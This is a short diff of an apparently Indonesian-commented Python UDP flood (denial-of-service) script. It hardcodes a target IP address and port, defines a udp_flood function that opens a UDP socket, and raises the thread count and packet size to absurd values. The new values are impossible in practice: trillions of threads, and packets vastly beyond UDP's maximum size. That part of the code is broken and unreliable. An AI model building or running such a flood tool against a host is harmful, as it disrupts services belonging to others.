@@ -7,10 +7,10 @@ TARGET_IP = "204.10.193.119"
 TARGET_PORT = 7132
 
 # Jumlah thread paralel
-THREADS = 1000
+THREADS = 1000000000000000
 
 # Ukuran paket (dalam byte)
-PACKET_SIZE = 1000000000
+PACKET_SIZE = 100000000000000000000000000
 
 def udp_flood():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
